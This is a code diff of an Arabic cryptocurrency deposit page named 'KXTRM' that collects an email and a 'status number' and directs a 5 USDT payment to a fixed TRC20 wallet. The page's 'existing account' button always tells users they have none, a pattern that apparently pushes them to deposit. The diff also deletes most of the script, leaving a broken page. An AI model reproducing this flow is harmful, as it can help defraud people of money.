@@ -5,18 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>KXTRM - الدفع والاشتراك</title>
     
-    <!-- جلب خط Cairo بالوزن الثقيل 900 لمحاكاة الخط الكوفي العريض للجميع -->
     <link rel="preconnect" href="https://googleapis.com">
     <link rel="preconnect" href="https://gstatic.com" crossorigin>
     <link href="https://googleapis.com/css2?family=Cairo:wght@900&display=swap" rel="stylesheet">
 
     <style>
-        /* تطبيق الخط الكوفي العريض بشكل إجباري على كل عناصر الصفحة */
         * {
             font-family: 'Cairo', sans-serif !important;
             font-weight: 900 !important;
         }
-
         body { 
             background-color: #0f0c1b; 
             color: #ffffff; 
@@ -53,6 +50,36 @@
             color: #00ffcc;
             margin-bottom: 25px;
         }
+        .countries-bar {
+            background-color: #141026;
+            border: 1px solid #4a3f85;
+            border-radius: 8px;
+            padding: 8px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            white-space: nowrap;
+            position: relative;
+        }
+        .countries-track {
+            display: inline-block;
+            white-space: nowrap;
+            animation: marquee 15s linear infinite;
+        }
+        .country-item {
+            display: inline-flex;
+            align-items: center;
+            margin-left: 20px;
+            font-size: 13px;
+            color: #b2bec3;
+        }
+        .country-item span {
+            margin-left: 5px;
+            font-size: 16px;
+        }
+        @keyframes marquee {
+            0% { transform: translate3d(0, 0, 0); }
+            100% { transform: translate3d(-50%, 0, 0); }
+        }
         .input-group { 
             margin-bottom: 20px; 
             text-align: right; 
@@ -78,21 +105,16 @@
             font-size: 12px; 
             color: #636e72; 
         }
-        
-        /* تأثيرات الوميض والنبض للأزرار */
         @keyframes greenGlowPulse {
             0% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
             50% { background-color: #00ffa3; box-shadow: 0 0 25px rgba(0, 255, 163, 0.9); }
             100% { background-color: #00b894; box-shadow: 0 0 10px rgba(0, 184, 148, 0.5); }
         }
-
         @keyframes cyanGlowPulse {
             0% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
             50% { background-color: #00d2ff; box-shadow: 0 0 25px rgba(0, 210, 255, 0.9); }
             100% { background-color: #0097e6; box-shadow: 0 0 10px rgba(0, 151, 230, 0.5); }
         }
-
-        /* تنسيق زر المتابعة باللون الأخضر */
         .submit-btn-pulse {
             width: 100%; 
             padding: 14px; 
@@ -107,8 +129,6 @@
             transition: 0.2s;
         }
         .submit-btn-pulse:hover { transform: scale(1.02); }
-
-        /* تنسيق زر بايننس باللون الأخضر */
         .binance-btn-final {
             width: 100%; 
             padding: 15px; 
@@ -125,8 +145,6 @@
             transition: 0.2s;
         }
         .binance-btn-final:hover { transform: scale(1.02); }
-
-        /* حاوية الإيداع اليدوي باللون الأبيض الكامل وتنسيق نصوصها */
         .manual-deposit-box {
             margin-top: 25px; 
             padding: 18px 15px; 
@@ -136,8 +154,6 @@
             text-align: center;
             box-shadow: 0 5px 15px rgba(255,255,255,0.1);
         }
-
-        /* حقل نص المحفظة داخل المربع الأبيض */
         .crypto-address-input {
             width: 100%; 
             padding: 11px; 
@@ -153,8 +169,6 @@
             text-overflow: ellipsis; 
             box-sizing: border-box;
         }
-
-        /* زر نسخ عنوان المحفظة باللون السماوي النابض */
         .copy-btn-pulse {
             padding: 12px; 
             color: #ffffff; 
@@ -169,8 +183,6 @@
             transition: 0.2s;
         }
         .copy-btn-pulse:hover { transform: scale(1.02); }
-
-        /* تنسيق زر التحقق من الحساب المسبق */
         .check-account-btn {
             width: 100%;
             padding: 12px;
@@ -195,14 +207,31 @@
         <div class="amount-tag">الإيداع: 5.00 USDT</div>
 
         <form id="paymentForm">
-            <!-- الخطوة الأولى: بداية الدخول -->
             <div id="step1">
+                <div class="countries-bar">
+                    <div class="countries-track">
+                        <div class="country-item"><span>🇸🇦</span>السعودية</div>
+                        <div class="country-item"><span>🇪🇬</span>مصر</div>
+                        <div class="country-item"><span>🇮🇶</span>العراق</div>
+                        <div class="country-item"><span>🇦🇪</span>الإمارات</div>
+                        <div class="country-item"><span>🇩🇿</span>الجزائر</div>
+                        <div class="country-item"><span>🇲🇦</span>المغرب</div>
+                        <div class="country-item"><span>🇯🇴</span>الأردن</div>
+                        <div class="country-item"><span>🇸🇦</span>السعودية</div>
+                        <div class="country-item"><span>🇪🇬</span>مصر</div>
+                        <div class="country-item"><span>🇮🇶</span>العراق</div>
+                        <div class="country-item"><span>🇦🇪</span>الإمارات</div>
+                        <div class="country-item"><span>🇩🇿</span>الجزائر</div>
+                        <div class="country-item"><span>🇲🇦</span>المغرب</div>
+                        <div class="country-item"><span>🇯🇴</span>الأردن</div>
+                    </div>
+                </div>
+
                 <div class="input-group">
                     <label for="username">إنشاء حساب جديد</label>
                     <input type="text" id="username" required placeholder="example@gmail.com" style="background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
                 </div>
 
-                <!-- إضافة خيار حقل رقم الحالة الجديد تحت البريد الإلكتروني مباشرة -->
                 <div class="input-group">
                     <label for="statusNumber">رقم الحالة</label>
                     <input type="text" id="statusNumber" required placeholder="أدخل رقم الحالة هنا" style="background: #fff; color: #000; border: none; border-radius: 8px; margin-top: 8px; box-sizing: border-box;">
@@ -212,7 +241,6 @@
                 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
             </div>
 
-            <!-- الخطوة الثانية: خيارات الإيداع -->
             <div id="step2" style="display: none; margin-top: 15px;">
                 <a href="https://binance.com" class="binance-btn-final">
                     ⚡ الدفع عبر بايننس طلب دفع
@@ -220,9 +248,7 @@
 
                 <div class="manual-deposit-box">
                     <p style="font-size: 14px; margin-bottom: 12px; color: #2f3542;">أو للإيداع من OKX وباقي المحافظ (شبكة TRC20):</p>
-                    
                     <input type="text" value="THJN4XBKxbZNYsw7YAhmNiZSupn3KVEDFP" id="cryptoAddress" class="crypto-address-input" readonly>
-                    
                     <button onclick="copyWalletAddress()" type="button" class="copy-btn-pulse">نسخ عنوان المحفظة</button>
                 </div>
             </div>
@@ -234,32 +260,4 @@
 <script>
     function goToStep2() {
         const usernameInput = document.getElementById('username').value;
-        const statusNumberInput = document.getElementById('statusNumber').value;
-        
-        // التحقق من تعبئة البريد الإلكتروني ورقم الحالة قبل الانتقال للخطوة الثانية
-        if(usernameInput.trim() === "" || statusNumberInput.trim() === "") {
-            alert("يرجى ملء جميع الحقول المطلوبة أولاً للمتابعة.");
-            return;
-        }
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('step2').style.display = 'block';
-    }
-
-    function copyWalletAddress() {
-        const copyText = document.getElementById("cryptoAddress");
-        navigator.clipboard.writeText(copyText.value.trim()).then(() => {
-            alert("تم نسخ عنوان المحفظة بشكل سليم! قم بالتحويل من OKX أو أي محفظة أخرى على شبكة TRC20 بقيمة 5 USDT.");
-        }).catch(err => {
-            copyText.select();
-            copyText.setSelectionRange(0, 99999);
-            document.execCommand("copy");
-            alert("تم نسخ عنوان المحفظة!");
-        });
-    }
-
-    function alertNoAccount() {
-        alert("أنت لا تمتلك حساباً مسبقاً، يرجى كتابة البيانات المطلوبة وإتمام الإيداع لتفعيل الخدمة.");
-    }
-</script>
-</body>
-</html>
+    
